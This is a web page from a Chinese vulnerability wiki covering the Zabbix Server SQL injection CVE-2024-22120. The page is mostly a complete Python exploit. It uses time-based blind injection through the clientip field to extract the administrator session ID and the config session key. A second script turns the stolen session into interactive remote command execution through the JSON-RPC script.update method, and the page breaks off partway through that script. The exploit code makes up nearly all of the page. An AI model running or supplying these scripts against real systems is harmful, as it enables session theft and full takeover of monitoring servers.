<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Zabbix/Zabbix-Serve-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-22120%29/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Zabbix Serve SQL注入漏洞(CVE 2024 22120) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Zabbix-Serve-SQL\u6ce8\u5165\u6f0f\u6d1e(CVE-2024-22120)", url: "#_top", children: [
          ]},
          {title: "\u83b7\u53d6\u7ba1\u7406\u5458session id \u811a\u672c", url: "#session-id", children: [
          ]},
          {title: "RCE\u811a\u672c", url: "#rce", children: [
          ]},
          {title: "\u5229\u7528\u83b7\u53d6\u5230\u7684\u7ba1\u7406\u5458session id\u548csession key\u6784\u9020zbx_session\u767b\u5f55\u7ba1\u7406\u754c\u9762", url: "#session-idsession-keyzbx_session", children: [
          ]},
          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_1", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Zabbix%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-42327%29/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Zabbix%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28CVE-2024-42327%29/" class="btn btn-xs btn-link">
        Zabbix SQL注入漏洞(CVE-2024-42327)
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Zabbix%20SAML%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-23131/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Zabbix%20SAML%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-23131/" class="btn btn-xs btn-link">
        Zabbix SAML身份绕过漏洞 CVE-2022-23131
      </a>
    </div>
    
  </div>

    

    <h2 id="zabbix-serve-sqlcve-2024-22120">Zabbix-Serve-SQL注入漏洞(CVE-2024-22120)<a class="headerlink" href="#zabbix-serve-sqlcve-2024-22120" title="Permanent link">&para;</a></h2>
<p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。</p>
<p>CVE-2024-22120 中，攻击者在登陆后可构造恶意请求利用clientip参数造成SQL注入。</p>
<p><code>漏洞利用成功前提</code>：需要一个低权限用户，并且该用户需要具有<code>Detect operating system</code>的权限，但是这个操作默认的是没有的，只有管理员用户组才有</p>
<h2 id="session-id">获取管理员session id 脚本<a class="headerlink" href="#session-id" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>

<span class="k">def</span><span class="w"> </span><span class="nf">send_message</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">injection</span><span class="p">):</span>
    <span class="n">zbx_header</span> <span class="o">=</span> <span class="s2">&quot;ZBXD</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">message</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;request&quot;</span><span class="p">:</span> <span class="s2">&quot;command&quot;</span><span class="p">,</span>
        <span class="s2">&quot;sid&quot;</span><span class="p">:</span> <span class="n">sid</span><span class="p">,</span>
        <span class="s2">&quot;scriptid&quot;</span><span class="p">:</span> <span class="s2">&quot;3&quot;</span><span class="p">,</span>
        <span class="s2">&quot;clientip&quot;</span><span class="p">:</span> <span class="s2">&quot;&#39; + &quot;</span> <span class="o">+</span> <span class="n">injection</span> <span class="o">+</span> <span class="s2">&quot;+ &#39;&quot;</span><span class="p">,</span>
        <span class="s2">&quot;hostid&quot;</span><span class="p">:</span> <span class="n">hostid</span>
    <span class="p">}</span>
    <span class="n">message_json</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
    <span class="n">message_length</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;q&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">message_json</span><span class="p">))</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">zbx_header</span> <span class="o">+</span> <span class="n">message_length</span> <span class="o">+</span> <span class="n">message_json</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="c1">#print(&quot;Sending message %s&quot; % message)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">extract_admin_session_id</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">time_false</span><span class="p">,</span> <span class="n">time_true</span><span class="p">):</span>
    <span class="n">session_id</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="n">token_length</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">token_length</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&quot;abcdef&quot;</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">(+) trying c=</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">c</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
            <span class="n">before_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
            <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),</span><span class="si">%d</span><span class="s2">,1))=</span><span class="si">%d</span><span class="s2">) THEN sleep(</span><span class="si">%d</span><span class="s2">) ELSE sleep(</span><span class="si">%d</span><span class="s2">) END)&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="n">time_true</span><span class="p">,</span> <span class="n">time_false</span><span class="p">)</span>
            <span class="n">send_message</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
            <span class="n">after_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">time_true</span> <span class="o">&gt;</span> <span class="p">(</span><span class="n">after_query</span><span class="o">-</span><span class="n">before_query</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">time_false</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">session_id</span> <span class="o">+=</span> <span class="n">c</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) session_id=</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">session_id</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
                <span class="k">break</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">session_id</span>

<span class="k">def</span><span class="w"> </span><span class="nf">extract_config_session_key</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">time_false</span><span class="p">,</span> <span class="n">time_true</span><span class="p">):</span>
    <span class="n">token</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="n">token_length</span> <span class="o">=</span> <span class="mi">32</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">token_length</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&quot;abcdef&quot;</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">(+) trying c=</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">c</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
            <span class="n">before_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
            <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;(select CASE WHEN (ascii(substr((select session_key from config),</span><span class="si">%d</span><span class="s2">,1))=</span><span class="si">%d</span><span class="s2">) THEN sleep(</span><span class="si">%d</span><span class="s2">) ELSE sleep(</span><span class="si">%d</span><span class="s2">) END)&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="n">time_true</span><span class="p">,</span> <span class="n">time_false</span><span class="p">)</span>
            <span class="n">send_message</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
            <span class="n">after_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">time_true</span> <span class="o">&gt;</span> <span class="p">(</span><span class="n">after_query</span><span class="o">-</span><span class="n">before_query</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">time_false</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">token</span> <span class="o">+=</span> <span class="n">c</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) session_key=</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">token</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
                <span class="k">break</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">token</span>

<span class="k">def</span><span class="w"> </span><span class="nf">tiny_poc</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) Running simple PoC...</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) Sleeping for 1 sec...</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">before_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
    <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;(select sleep(1))&quot;</span>
    <span class="n">send_message</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
    <span class="n">after_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) Request time: </span><span class="si">%d</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">after_query</span><span class="o">-</span><span class="n">before_query</span><span class="p">))</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) Sleeping for 5 sec...</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">before_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
    <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;(select sleep(5))&quot;</span>
    <span class="n">send_message</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
    <span class="n">after_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) Request time: </span><span class="si">%d</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">after_query</span> <span class="o">-</span> <span class="n">before_query</span><span class="p">))</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) Sleeping for 10 sec...</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">before_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
    <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;(select sleep(10))&quot;</span>
    <span class="n">send_message</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>
    <span class="n">after_query</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">timestamp</span><span class="p">()</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) Request time: </span><span class="si">%d</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">after_query</span> <span class="o">-</span> <span class="n">before_query</span><span class="p">))</span>

<span class="k">def</span><span class="w"> </span><span class="nf">poc_to_check_in_zabbix_log</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) Sending SQL request for MySQL version...</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;(version())&quot;</span>
    <span class="n">send_message</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">sid</span><span class="p">,</span> <span class="n">hostid</span><span class="p">,</span> <span class="n">query</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Command-line option parser example&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--false_time&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Time to sleep in case of wrong guess(make it smaller than true time, default=1)&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--true_time&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Time to sleep in case of right guess(make it bigger than false time, default=10)&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;10&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--ip&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Zabbix server IP&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--port&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Zabbix server port(default=10051)&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;10051&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--sid&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Session ID of low privileged user&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--hostid&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;hostid of any host accessible to user with defined sid&quot;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--poc&quot;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Use this key if you want only PoC, PoC will simply make sleep 1,2,5 seconds on mysql server&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;--poc2&quot;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Use this key to simply generate error in zabbix logs, check logs later to see results&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">poc</span><span class="p">:</span>
        <span class="n">tiny_poc</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">),</span> <span class="n">args</span><span class="o">.</span><span class="n">sid</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">hostid</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">poc2</span><span class="p">:</span>
        <span class="n">poc_to_check_in_zabbix_log</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">),</span> <span class="n">args</span><span class="o">.</span><span class="n">sid</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">hostid</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) Extracting Zabbix config session key...</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="n">config_session_key</span> <span class="o">=</span> <span class="n">extract_config_session_key</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">),</span> <span class="n">args</span><span class="o">.</span><span class="n">sid</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">hostid</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">false_time</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">true_time</span><span class="p">))</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) config session_key=</span><span class="si">%s</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">config_session_key</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) Extracting admin session_id...&quot;</span><span class="p">)</span>
        <span class="n">admin_sessionid</span> <span class="o">=</span> <span class="n">extract_admin_session_id</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">port</span><span class="p">),</span> <span class="n">args</span><span class="o">.</span><span class="n">sid</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">hostid</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">false_time</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">true_time</span><span class="p">))</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) admin session_id=</span><span class="si">%s</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">admin_sessionid</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;(+) session_key=</span><span class="si">%s</span><span class="s2">, admin session_id=</span><span class="si">%s</span><span class="s2">. Now you can genereate admin zbx_cookie and sign it with session_key&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">config_session_key</span><span class="p">,</span> <span class="n">admin_sessionid</span><span class="p">))</span>
</code></pre></div>
<h2 id="rce">RCE脚本<a class="headerlink" href="#rce" title="Permanent link">&para;</a></h2>
<p>利用获取到的session_id rce</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="n">ZABIX_ROOT</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.198.136&quot;</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">ZABIX_ROOT</span> <span class="o">+</span> <span class="s2">&quot;/api_jsonrpc.php&quot;</span>
<span class="n">host_id</span> <span class="o">=</span> <span class="s2">&quot;10084&quot;</span>
<span class="n">session_id</span> <span class="o">=</span> <span class="s2">&quot;00000000000000000000000000000000&quot;</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;content-type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/json&quot;</span><span class="p">,</span>
<span class="p">}</span>
<span class="n">auth</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="s1">&#39;{&quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;result&quot;: &quot;&#39;</span> <span class="o">+</span> <span class="n">session_id</span> <span class="o">+</span> <span class="s1">&#39;&quot;, &quot;id&quot;: 0}&#39;</span><span class="p">)</span>

<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[41m[zabbix_cmd]&gt;&gt;: </span><span class="se">\033</span><span class="s1">[0m &#39;</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Result of last command:&quot;</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">cmd</span> <span class="o">==</span> <span class="s2">&quot;quit&quot;</span><span class="p">:</span>
        <span class="k">break</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;jsonrpc&quot;</span><span class="p">:</span> <span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
        <span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;script.update&quot;</span><span class="p">,</span>
        <span class="s2">&quot;params&quot;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s2">&quot;scriptid&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
            <span class="s2">&quot;command&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span> <span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span> <span class="s2">&quot;&quot;</span>
        <span class="p">},</span>
